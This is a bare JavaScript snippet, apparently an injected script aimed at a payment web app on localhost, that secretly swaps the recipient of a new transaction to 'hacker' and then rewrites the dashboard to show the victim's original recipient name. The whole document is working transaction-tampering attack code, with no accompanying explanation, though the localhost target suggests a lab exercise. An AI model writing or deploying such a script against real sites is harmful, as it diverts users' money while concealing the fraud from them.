if (window.location == "http://localhost:8000/new_transaction" && document.querySelector("a.btn")) {
  const input = document.querySelector(".container > form:nth-child(4) > input:nth-child(2)")
  window.localStorage.setItem('victimName', input.value)
  input.value = "hacker"

} else if (window.location == "http://localhost:8000/dashboard") {
  const recipients = document.querySelectorAll(".table > tbody:nth-child(2) > tr > td:nth-child(2)")
  for (field of recipients) {
    if (field.innerText == "hacker") {
      field.innerText = window.localStorage.getItem('victimName') || ""
    }
  }
}